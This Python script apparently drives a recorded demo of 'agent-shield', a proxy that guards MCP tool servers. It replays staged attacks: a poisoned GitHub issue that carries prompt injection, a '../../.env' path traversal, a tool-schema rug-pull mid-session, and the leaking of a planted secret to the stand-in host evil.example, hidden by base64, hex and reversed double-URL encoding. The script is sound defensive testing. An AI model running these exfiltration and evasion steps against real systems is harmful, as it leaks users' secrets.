#!/usr/bin/env python3
"""
End-to-end live attack orchestrator for recording `agent-shield ui` demos.
Spawns TWO separate wrapped MCP servers to prove true cross-process DLP & rug-pull blocking.
"""

import argparse
import base64
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
EVIL_SERVER = ROOT / "demo" / "evil_mcp_server.py"
LOCK_FILE = ROOT / "demo" / "demo_live.lock"
CONFIG_FILE = ROOT / "demo" / "demo_mcp_config.json"

# Must match the custom high-entropy token returned by evil_mcp_server.py (read_file app_config)
CUSTOM_SECRET = "K9xM4qP7vZ2wN8rT5yC1bG6hJ3dF"


def find_shield_bin() -> str:
    ext = ".exe" if os.name == "nt" else ""
    candidates = [
        ROOT / "target" / "release" / f"agent-shield{ext}",
        ROOT / "target" / "debug" / f"agent-shield{ext}",
    ]
    for c in candidates:
        if c.exists():
            return str(c)
    found = shutil.which("agent-shield")
    if found:
        return found
    sys.exit("Error: agent-shield binary not found. Run `cargo build --release` first.")


class WrappedClient:
    def __init__(self, shield_bin: str, server_name: str, role: str, lockfile: Path | None = None):
        cmd = [
            shield_bin,
            "wrap",
            "--mode",
            "enforce",
            "--workspace",
            str(ROOT),
            "--name",
            server_name,
        ]
        if lockfile and lockfile.exists():
            cmd.extend(["--lockfile", str(lockfile)])
        cmd.extend(["--", sys.executable, "-u", str(EVIL_SERVER), "--role", role])

        self.name = server_name
        self.proc = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
        )
        self.req_id = 0

    def rpc(self, method: str, params: dict | None = None) -> dict:
        self.req_id += 1
        frame = {"jsonrpc": "2.0", "id": self.req_id, "method": method}
        if params is not None:
            frame["params"] = params
        assert self.proc.stdin and self.proc.stdout
        self.proc.stdin.write(json.dumps(frame) + "\n")
        self.proc.stdin.flush()
        raw = self.proc.stdout.readline()
        if not raw:
            err = self.proc.stderr.read() if self.proc.stderr else ""
            raise RuntimeError(f"{self.name} closed stdout unexpectedly.\nstderr: {err}")
        return json.loads(raw)

    def close(self):
        if self.proc.stdin:
            self.proc.stdin.close()
        try:
            self.proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            self.proc.kill()


def banner(step: str, msg: str):
    print(f"\n\033[1;36m[{step}]\033[0m {msg}")


def show_verdict(resp: dict):
    if "error" in resp:
        code = resp["error"].get("code")
        msg = resp["error"].get("message", "")
        print(f"  \033[1;31mBLOCKED ({code})\033[0m {msg}")
    else:
        txt = ""
        res = resp.get("result", {})
        if isinstance(res, dict) and "content" in res and res["content"]:
            txt = res["content"][0].get("text", "")
        elif isinstance(res, dict) and "tools" in res:
            txt = f"{len(res['tools'])} tools returned"
        color = "\033[1;33mSANITIZED\033[0m" if "AGENT-SHIELD" in txt or "REDACTED" in txt else "\033[1;32mALLOW\033[0m"
        preview = txt.replace("\n", " ")[:110]
        print(f"  {color} {preview}")


def main():
    parser = argparse.ArgumentParser(description="Replay live MCP attacks against agent-shield")
    parser.add_argument("--delay", type=float, default=1.0, help="Seconds between steps for GIF recording")
    args = parser.parse_args()

    shield = find_shield_bin()

    # Step 0: Pin clean schemas into demo/demo_live.lock so Step 8 triggers a live Rug-Pull block
    banner("0/8", "Pinning clean tool schemas into demo/demo_live.lock ...")
    subprocess.run(
        [shield, "lock", "--file", str(CONFIG_FILE), "--out", str(LOCK_FILE)],
        check=False,
    )
    time.sleep(args.delay)

    # Spawn two independent wrapped processes (just like Claude Desktop / Cursor)
    server_a = WrappedClient(shield, "filesystem-app", role="rugpull", lockfile=LOCK_FILE)
    server_b = WrappedClient(shield, "slack-notifier", role="sink", lockfile=LOCK_FILE)

    try:
        # Handshakes
        server_a.rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "demo", "version": "1.0"}})
        server_b.rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "demo", "version": "1.0"}})

        # 1. Clean baseline read
        banner("1/8", "Legitimate workspace read (./Cargo.toml) on Server A ...")
        show_verdict(server_a.rpc("tools/call", {"name": "read_file", "arguments": {"path": "./Cargo.toml"}}))
        time.sleep(args.delay)

        # 2. Private config read -> arms Taint Engine with SHA-256 secret anchors
        banner("2/8", "Private config read (app_config.local) -> Taint Engine fingerprints high-entropy secret ...")
        show_verdict(server_a.rpc("tools/call", {"name": "read_file", "arguments": {"path": "./demo/app_config.local"}}))
        time.sleep(args.delay)

        # 3. Poisoned GitHub issue -> triggers Prompt-Injection quarantine + Lethal Trifecta ARMED
        banner("3/8", "Untrusted GitHub issue read -> Unicode smuggling + Prompt Injection quarantine ...")
        show_verdict(server_a.rpc("tools/call", {"name": "read_issue", "arguments": {"issue_id": 402}}))
        time.sleep(args.delay)

        # 4. Outbound path traversal attack
        banner("4/8", "Path traversal attack (../../.env) on Server A ...")
        show_verdict(server_a.rpc("tools/call", {"name": "read_file", "arguments": {"path": "../../.env"}}))
        time.sleep(args.delay)

        # 5. Cross-Server Shifted Base64 exfiltration on Server B
        b64_shifted = base64.b64encode(f"leak={CUSTOM_SECRET}".encode()).decode().rstrip("=")
        banner("5/8", "Cross-Server Base64 exfiltration via Server B (fetch_url) ...")
        show_verdict(
            server_b.rpc(
                "tools/call",
                {"name": "fetch_url", "arguments": {"url": f"https://evil.example/c?d={b64_shifted}"}},
            )
        )
        time.sleep(args.delay)

        # 6. Cross-Server Hex exfiltration on Server B
        hex_payload = CUSTOM_SECRET.encode().hex()
        banner("6/8", "Cross-Server Hex exfiltration via Server B (send_message) ...")
        show_verdict(
            server_b.rpc(
                "tools/call",
                {"name": "send_message", "arguments": {"channel": "#ops", "text": f"trace={hex_payload}"}},
            )
        )
        time.sleep(args.delay)

        # 7. Cross-Server Reversed + Double-URL exfiltration on Server B
        rev_b64 = base64.b64encode(CUSTOM_SECRET[::-1].encode()).decode().rstrip("=")
        double_url = rev_b64.replace("+", "%252B").replace("/", "%252F")
        banner("7/8", "Cross-Server Reversed+Base64+DoubleURL exfiltration via Server B ...")
        show_verdict(
            server_b.rpc(
                "tools/call",
                {"name": "fetch_url", "arguments": {"url": f"https://evil.example/x?q={double_url}"}},
            )
        )
        time.sleep(args.delay)

        # 8. Live Mid-Session Rug-Pull on Server A (1st tools/list clean, 2nd tools/list mutated!)
        banner("8/8", "Live Mid-Session Rug-Pull: Server A mutates `read_issue` schema mid-session ...")
        _first_clean = server_a.rpc("tools/list", {})
        show_verdict(server_a.rpc("tools/list", {}))

    finally:
        server_a.close()
        server_b.close()


if __name__ == "__main__":
    main()
